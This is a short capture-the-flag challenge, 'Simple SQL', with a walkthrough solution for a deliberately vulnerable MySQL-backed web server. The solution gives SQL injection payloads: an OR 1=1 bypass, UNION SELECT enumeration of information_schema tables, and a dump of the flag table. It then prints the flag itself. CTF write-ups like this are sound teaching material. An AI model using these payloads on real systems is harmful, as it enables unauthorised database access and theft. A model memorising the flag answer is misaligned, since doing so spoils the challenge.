# Simple SQL

## Description

I made a simple webserver connected to a MySQL database. Can you extract the flag from it?

## Dev Notes
**THIS IS A WALKTHROUGH CHALLENGE**

Start: `make run`
Stop: `make stop`

## Solution
SQL injection as seen by the payload
```
' OR 1=1;#
```
Which shows every entry in the table. Let's see what tables there are
```
' UNION SELECT table_name, 2, 3, 4 from information_schema.tables;#
```

All the way at the bottom there is a table called flag. Let's see what that contains
```
' UNION SELECT *, 2, 3, 4 from flag;#
```

And there's the flag:
```
gigem{th1s_1s_0nly_th3_b3g1nn1ng}
```
